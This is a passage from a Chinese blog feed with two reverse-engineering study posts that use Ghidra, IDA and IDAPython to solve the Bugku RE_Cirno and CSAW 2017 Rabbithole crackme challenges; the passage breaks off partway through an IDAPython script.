        <content type="html"><![CDATA[<h1 id="Ghira"><a href="#Ghira" class="headerlink" title="Ghira"></a>Ghira</h1><p>其实我觉得和IDA 差不多吧</p><p>下载地址：</p><p><a href="https://ghidra-sre.org/">https://Ghidra-sre.org</a></p><p>需要又java 11+   【我用的是java 11】</p><p>主要就不介绍了，用法感觉和IDA 差不多</p><p>我们先来写一个题【CTF】</p><p>该题来自    Bugku逆向 RE_Cirno</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516211310012.png" alt="image-20230516211310012" style="zoom:33%;" /><p>打开发现是一个.jpg的图片 。 图片肯定又问题啦。藏得有东西</p><p>用101打开看看</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516212445604.png" alt="image-20230516212445604" style="zoom: 50%;" /><p>通过<a href="http://doc.chacuo.net/filehead">http://doc.chacuo.net/filehead</a> 这个网址就能找到一些文件头的都行。然后再010里面可以搜索一下。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516212603392.png" alt="image-20230516212603392"></p><p>其实这一步也可以省略啦。直接用工具binwalk来查看这个JPG图片</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516210947106.png" alt="image-20230516210947106" style="zoom:50%;" /><p>很明显的看到，里面不只有这个jpg 还有一个zip的样子。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516211111591.png" alt="image-20230516211111591" style="zoom: 33%;" /><p>用binwalk -e 的命令把他搞出来。 就得到一个exe文件。</p><p>ok 现在就是再这个exe文件里面找到flag就好了</p><p>拿到文件。首先运行一下啦</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516213034725.png" alt="image-20230516213034725"></p><p>从这里就可以看到</p><p>：琪露诺酱在冻青蛙的路上,突然被9层栅栏反方向围住了,找不到方向,你可以帮助她找到路吗?<br>：请按任意键继续. . .</p><p>首先分析一下：“请按任意键继续. . .” 说明程序运行到这里就停下来了。然后你按下任意一个健就退出了..</p><p>我们来猜测一下这里肯定有一个暂停的功能</p><p>pause – 暂停</p><p>用IDA 打开</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516213607439.png" alt="image-20230516213607439" style="zoom:50%;" /><p>在main 里面就看到了这个pause 。 说明这里就是我们要分析的地方</p><p>看反汇编的代码</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516214156786.png" alt="image-20230516214156786" style="zoom:50%;" /><p>发现调用这个pause是xref 交叉应用..我们跳转过去</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516214407602.png" alt="image-20230516214407602" style="zoom:33%;" /><p>这里就是这个代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0040F459 68 A4 2F 42 00                push    offset Command                  ; &quot;pause&quot;</span><br><span class="line">.text:0040F45E E8 DD FD FF FF                call    _system</span><br><span class="line">.text:0040F45E</span><br><span class="line">.text:0040F463 83 C4 04                      add     esp, 4</span><br><span class="line">.text:0040F466 33 C0                         xor     eax, eax</span><br><span class="line">.text:0040F468 5F                            pop     edi</span><br><span class="line">.text:0040F469 5E                            pop     esi</span><br><span class="line">.text:0040F46A 5B                            pop     ebx</span><br><span class="line">.text:0040F46B 81 C4 AC 00 00 00             add     esp, 0ACh</span><br><span class="line">.text:0040F471 3B EC                         cmp     ebp, esp</span><br><span class="line">.text:0040F473 E8 58 1D FF FF                call    __chkesp</span><br><span class="line">.text:0040F473</span><br><span class="line">.text:0040F478 8B E5                         mov     esp, ebp</span><br><span class="line">.text:0040F47A 5D                            pop     ebp</span><br><span class="line">.text:0040F47B C3                            retn</span><br></pre></td></tr></table></figure><p>这里调用了_system 和 __chkesp</p><p>伪代码看一下</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516220051690.png" alt="image-20230516220051690" style="zoom: 33%;" /><p>发现就很奇怪…IDA7.7 和 7.0 编译出来的居然不一样….但是大致上又好像差不多…</p><p>有点蒙蔽。</p><p>而且在汇编代码中</p><p>.text:0040F466 33 C0                         xor     eax, eax</p><p>很明显又xor 但是这里又不管咋样的伪代码都没有….</p><p>这个很明显。这段的伪代码有问题….</p><p>难道只能看汇编代码了吗？？</p><p>不，我们还有Ghira </p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516221042217.png" alt="image-20230516221042217" style="zoom: 33%;" /><p>很明显 这个Ghira 反编译出来的就是对的…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">FUN_0040f350</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 *puVar2;</span><br><span class="line">  undefined4 local_b0 [<span class="number">16</span>];</span><br><span class="line">  uint local_70;</span><br><span class="line">  uint local_6c;</span><br><span class="line">  <span class="type">int</span> local_68;</span><br><span class="line">  <span class="type">int</span> local_64 [<span class="number">24</span>];</span><br><span class="line">  </span><br><span class="line">  puVar2 = local_b0;</span><br><span class="line">  <span class="keyword">for</span> (iVar1 = <span class="number">0x2b</span>; iVar1 != <span class="number">0</span>; iVar1 = iVar1 + <span class="number">-1</span>) &#123;</span><br><span class="line">    *puVar2 = <span class="number">0xcccccccc</span>;</span><br><span class="line">    puVar2 = puVar2 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  local_64[<span class="number">0</span>] = <span class="number">0x73</span>;</span><br><span class="line">  local_64[<span class="number">1</span>] = <span class="number">0x5e</span>;</span><br><span class="line">  local_64[<span class="number">2</span>] = <span class="number">0x61</span>;</span><br><span class="line">  local_64[<span class="number">3</span>] = <span class="number">0x72</span>;</span><br><span class="line">  local_64[<span class="number">4</span>] = <span class="number">0x67</span>;</span><br><span class="line">  local_64[<span class="number">5</span>] = <span class="number">0x2f</span>;</span><br><span class="line">  local_64[<span class="number">6</span>] = <span class="number">0x6b</span>;</span><br><span class="line">  local_64[<span class="number">7</span>] = <span class="number">0x72</span>;</span><br><span class="line">  local_64[<span class="number">8</span>] = <span class="number">0x41</span>;</span><br><span class="line">  local_64[<span class="number">9</span>] = <span class="number">0x30</span>;</span><br><span class="line">  local_64[<span class="number">10</span>] = <span class="number">0x31</span>;</span><br><span class="line">  local_64[<span class="number">11</span>] = <span class="number">0x69</span>;</span><br><span class="line">  local_64[<span class="number">12</span>] = <span class="number">0x75</span>;</span><br><span class="line">  local_64[<span class="number">13</span>] = <span class="number">0x76</span>;</span><br><span class="line">  local_64[<span class="number">14</span>] = <span class="number">0x65</span>;</span><br><span class="line">  local_64[<span class="number">15</span>] = <span class="number">0x30</span>;</span><br><span class="line">  local_64[<span class="number">16</span>] = <span class="number">0x71</span>;</span><br><span class="line">  local_64[<span class="number">17</span>] = <span class="number">0x5f</span>;</span><br><span class="line">  local_64[<span class="number">18</span>] = <span class="number">99</span>;</span><br><span class="line">  local_64[<span class="number">19</span>] = <span class="number">0x2f</span>;</span><br><span class="line">  local_64[<span class="number">20</span>] = <span class="number">0x5c</span>;</span><br><span class="line">  local_64[<span class="number">21</span>] = <span class="number">0x74</span>;</span><br><span class="line">  local_64[<span class="number">22</span>] = <span class="number">0x5d</span>;</span><br><span class="line">  local_64[<span class="number">23</span>] = <span class="number">0x66</span>;</span><br><span class="line">  <span class="keyword">for</span> (local_68 = <span class="number">0</span>; local_68 &lt; <span class="number">0x18</span>; local_68 = local_68 + <span class="number">1</span>) &#123;</span><br><span class="line">    local_70 = local_64[local_68] + <span class="number">9U</span> ^ <span class="number">9</span>;</span><br><span class="line">    local_6c = local_70;</span><br><span class="line">  &#125;</span><br><span class="line">  FUN_00401150(&amp;DAT_00422fac);</span><br><span class="line">  FUN_0040f240(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  local_64[<span class="number">23</span>] = <span class="number">0x40f478</span>;</span><br><span class="line">  __chkesp();</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看代码写c 这里的代码已经有反转字符串的意思了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> a[] = &#123;<span class="number">115</span>,<span class="number">94</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">103</span>,<span class="number">47</span>,<span class="number">107</span>,<span class="number">114</span>,<span class="number">65</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">105</span>,<span class="number">117</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">48</span>,<span class="number">113</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">47</span>,<span class="number">92</span>,<span class="number">116</span>,<span class="number">93</span>,<span class="number">102</span>&#125;;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> b = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">23</span>; i &gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">b = (a[i] + <span class="number">9</span>) ^ <span class="number">9</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516223534859.png" alt="image-20230516223534859" style="zoom:50%;" /><p>最后得到这个字符串</p><p>由于题目中“琪露诺酱在冻青蛙的路上,突然被9层栅栏反方向围住了,找不到方向,你可以帮助她找到路吗?”</p><p>栅栏密码9次解密就好了</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516223636053.png" alt="image-20230516223636053" style="zoom:50%;" /><hr><p>感觉这个Ghira确实安逸，能汇编和伪代码对应着看。比较巴士</p><p>然后这个。下次IDA有问题，伪代码奇奇怪怪的时候，就可以来找找Ghidra 或者 以后IDA和这个工具结合着看。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IDA Pro之IDA python介绍和功能（17）</title>
      <link href="/2023/05/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-17-IDA-Pro%E4%B9%8BIDA-Python%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%8A%9F%E8%83%BD/"/>
      <url>/2023/05/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-17-IDA-Pro%E4%B9%8BIDA-Python%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="IDA-IDC脚本编写语法"><a href="#IDA-IDC脚本编写语法" class="headerlink" title="IDA-IDC脚本编写语法"></a>IDA-IDC脚本编写语法</h1><p>搞得我想买一本IDA Pro 权威指南来看看了……【有机会就整来看一看】</p><p>这个IDC用的比较少吧。下面的有些例子也不能正确的使用…</p><p>可以通过下面这个网址找到更多的IDC脚本</p><p><a href="https://www.cnblogs.com/LyShark/p/13100048.html">https://www.cnblogs.com/LyShark/p/13100048.html</a></p><p>file -&gt; scriptcommand</p><p>file -&gt; script file</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230515134709557.png" alt="image-20230515134709557" style="zoom:50%;" /><p>由于这里汉化了，就比较容易了…</p><p>也许是这个用的少吧。笔记就不写了，反正也是copy也没有意义，就不浪费时间了。</p><hr><h1 id="IDA-Python"><a href="#IDA-Python" class="headerlink" title="IDA Python"></a>IDA Python</h1><p>IDC 能做到的 IDApython 也能做到，所以我们直接学IDApython 吧。</p><p>IDAPython 由三个独立的模块组成，一个是idc ， 它是封装IDA的IDC函数的兼容性模块，第二个模块是idautils,这是IDA里的一个高级实用功能模块；第三个模块是idaapi，它允许访问更加底层的数据。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230515140702108.png" alt="image-20230515140702108" style="zoom:50%;" /><p>首先 ， 我们知道我这个IDA7.7是基于这个python 3.8.10的版本..</p><p>要用pyhton 3 的语法 而不是 pyhton 2的语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">是<span class="built_in">print</span> (<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"></span><br><span class="line">而不是<span class="built_in">print</span> <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230515140906787.png" alt="image-20230515140906787" style="zoom:50%;" /><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230515140941109.png" alt="image-20230515140941109" style="zoom:50%;" /><p>又来咯，估计还得学python…..</p><hr><h3 id="写一个题吧。从题目中体会。"><a href="#写一个题吧。从题目中体会。" class="headerlink" title="写一个题吧。从题目中体会。"></a>写一个题吧。从题目中体会。</h3><p>题目来自CSAW CTF2017年的总决赛的一道逆向题目“Rabbithole”</p><p>题目和内容来自：</p><p><a href="https://blog.csdn.net/ChuMeng1999/article/details/121228002">https://blog.csdn.net/ChuMeng1999/article/details/121228002</a></p><p>首先用die 看一下</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230515233617314.png" alt="image-20230515233617314" style="zoom: 33%;" /><p>发现是一个64位的，而且是在一个linux下的一个文件。用kali 运行一下。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230515233754891.png" alt="image-20230515233754891" style="zoom: 33%;" /><p>“可以看到与一般的crackme差不多，就是要求我们输入，然后程序内部会有算法比对，如果不满足则报错”</p><p>现在用ida  64 位打开一下看一看。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230515234008986.png" alt="image-20230515234008986" style="zoom: 33%;" /><p>可以看到这个一打开就是flag 。 用F5 看一下伪代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">void</span> **v6; <span class="comment">// r8</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// al</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">128</span>]; <span class="comment">// [rsp+8h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v14; <span class="comment">// [rsp+88h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">32LL</span>;</span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = s;</span><br><span class="line">  <span class="keyword">while</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v4 = <span class="number">0</span>;</span><br><span class="line">    v4 += <span class="number">4</span>;</span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hey, what&#x27;s the flag?&quot;</span>);</span><br><span class="line">  v5 = <span class="string">&quot;Oh no, something went quite wrong!&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(s, <span class="number">127</span>, _bss_start) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  *<span class="built_in">strchr</span>(s, <span class="number">10</span>) = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="string">&quot;bad length much sad :(&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ~(<span class="built_in">strlen</span>(s) + <span class="number">1</span>) != <span class="number">-61LL</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  v6 = &amp;roots;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = check_value((<span class="type">unsigned</span> __int8)s[v7], v6[v7]);</span><br><span class="line">    v7 = v9 + <span class="number">1</span>;</span><br><span class="line">    v11 = v8 &amp; v10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 != <span class="number">59</span> );</span><br><span class="line">  v5 = <span class="string">&quot;You didn&#x27;t get it, much sadness :(&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You got it! correct! awesome!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">    <span class="built_in">puts</span>(v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这个主要的函数就是 check_value </p><p>这个check_value  有2个参数..s[v7]  和  v6[v7]</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230515234812909.png" alt="image-20230515234812909" style="zoom: 50%;" /><p>这个地方的v7 = 0LL      其实就是 0 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C/C++中各種不同型別的常數<span class="number">0</span>，以不同的後綴表示：</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>    <span class="comment">//int</span></span><br><span class="line"><span class="number">0L</span>   <span class="comment">//long</span></span><br><span class="line"><span class="number">0LL</span>  <span class="comment">//long long</span></span><br><span class="line"><span class="number">0UL</span>  <span class="comment">//unsigned long</span></span><br><span class="line"><span class="number">0.0</span>  <span class="comment">//double</span></span><br><span class="line"><span class="number">0.0f</span> <span class="comment">//float</span></span><br><span class="line"><span class="number">0.0L</span> <span class="comment">//long double</span></span><br></pre></td></tr></table></figure><p>由于下面的 v7!=59 说明了 这个while 循环循环 while 59次。</p><p>然后这里的这个v6 = &roots;  说明这个roots 是一个地址，把这个地址点过去看一看。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230515235142612.png" alt="image-20230515235142612" style="zoom:50%;" /><p>因为，我们学过这个汇编语言中这个 offset 大概知道这个其实是一个偏移地址，也就是指针【差不多吧】</p><p>所以这个roots[] 数组 ， 就是一个指针数组。。</p><p>然后去看看    check_value    这个函数的伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">check_value</span><span class="params">(<span class="type">unsigned</span> __int8 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( !*(_BYTE *)a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a2 + <span class="number">8</span>) &gt; a1 || *(_BYTE *)(a2 + <span class="number">9</span>) &lt;= a1 )</span><br><span class="line">      a2 = *(_QWORD *)(a2 + <span class="number">24</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      a2 = *(_QWORD *)(a2 + <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *(_BYTE *)(a2 + <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 第一个参数就是s[v7]  第二个参数是  v6[v7]</p><p>也就是说 第一个参数：s[v11]是用户输入input，第二个参数： (_int64)v10[v11])是roots。</p><p>至于为什么这个s[v11]是用户输入input，是因为fgets(s, 127, _bss_start)【应该是的吧。我是这样理解的】</p><p>这个fget()函数和get函数差不多。更牛皮一点罢了。【参数更多】</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(a2 + <span class="number">8</span>) &gt; a1 || *(_BYTE *)(a2 + <span class="number">9</span>) &lt;= a1 )</span><br><span class="line">  a2 = *(_QWORD *)(a2 + <span class="number">24</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  a2 = *(_QWORD *)(a2 + <span class="number">16</span>);</span><br></pre></td></tr></table></figure><p>大概看一下这个代码。估计也就是算法，把不同情况下的东西进行不同的操作。</p><p>首先是roots指针数组的起始位置，因为node的地址都是在其上进行偏移计算的。</p><p>可以看到其值为28f900：</p><p>然后需要写两个函数，一个用于遍历，一个用于校验。<br>前面已经分析过遍历的次数是59次，10进制的59就是16进制的0x3b。<br>使用ida_bytes.get_qword来取得node的地址：</p><p>接下来就是在ascii字符中遍历了，我们知道ascii码中32-126是字符，即需要在0x20到0x7f的范围内遍历。针对每一个可能的字符都是用校验函数来校验，如果返回为真，则将其添加进flag，然后break循环，然后在roots数组中偏移8取下一个node，再针对下一个位置的字符再次遍历。</p><p>所以校验的函数应该这么写：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">0</span>,<span class="number">0x3b</span>)</span> :</span></span><br><span class="line"><span class="function">    node =</span> <span class="built_in">get_qword</span>(roots)  <span class="meta">#read the node<span class="string">&#x27;s address</span></span></span><br><span class="line"><span class="string"><span class="meta">    c = 0x20</span></span></span><br><span class="line"><span class="string"><span class="meta">    while c &lt;= 0x7f :</span></span></span><br><span class="line"><span class="string"><span class="meta">        if traverse_find(node,c) == 1:</span></span></span><br><span class="line"><span class="string"><span class="meta">            flag+= chr(c)</span></span></span><br><span class="line"><span class="string"><span class="meta">            break</span></span></span><br><span class="line"><span class="string"><span class="meta">        c+= 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    roots += 8  #next root node</span></span></span><br></pre></td></tr></table></figure><p>这里的traverse_find 函数就是我们等会儿要写的进行校验的函数。</p><p>Traverse_find的逻辑其实就是check_value伪码的逻辑，只要注意两点：<br>1.逻辑，如下图，C伪码中使用的是||逻辑表达式，比如A||B，意思是满足A，B中的任一个就为真。<br>简化的表示：<br>下图中的A就是*(_BYTE <em>)(a2 + 8)，B就是</em>(_BYTE <em>)(a2 + 9)，C就是a2 =</em>(_QWORD <em>)(a2 + 24)，D就是a2 =</em>(_QWORD *)(a2 + 16)。<br>伪码的逻辑是满足A&gt;a1或B&lt;=a1（a1就是input），则执行C，否则执行D；<br>我在python脚本里使用的是and，所以判断的语句用的是：<br>A &lt;= c and B &gt; c（这里c就是input）。<br>如果满足条件，则执行D，否则执行C；<br>可以看到python和C伪码的逻辑是一样的，不过用的逻辑运算符不一样而已，这里一定要注意，不要混淆了。<br>2.进制转换：<br>比如下图中第6行，第8行的两个分支：</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230516000437375.png" alt="image-20230516000437375" style="zoom: 50%;" /><p>他们在原基础上继续偏移24，16；转换成16进制分别是0x18，0x10。</p><p>最后写出来的IDA python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> * <span class="comment">#导入包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">traverse_find</span>(<span class="params">node,c</span>):</span><br><span class="line">        <span class="keyword">if</span> get_byte(node) == <span class="number">1</span>:</span><br><span class="line">            r = get_byte(node+<span class="number">8</span>) &amp; <span class="number">0x1</span></span><br><span class="line"><span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        b1 = get_byte(node+<span class="number">8</span>)</span><br><span class="line">        b2 = get_byte(node+<span class="number">9</span>)</span><br><span class="line">        <span class="keyword">if</span> c &gt;= b1 <span class="keyword">and</span> c &lt; b2:<span class="comment">#这里相当于一个满足了条件后的回调函数</span></span><br><span class="line">            <span class="keyword">return</span> traverse_find(get_qword(node+<span class="number">0x10</span>),c)<span class="comment">#+16</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> traverse_find(get_qword(node+<span class="number">0x18</span>),c)<span class="comment">#+24</span></span><br><span class="line"><span class="comment">#---------------定义check_value伪码的逻辑------------------------</span></span><br><span class="line">flag = <span 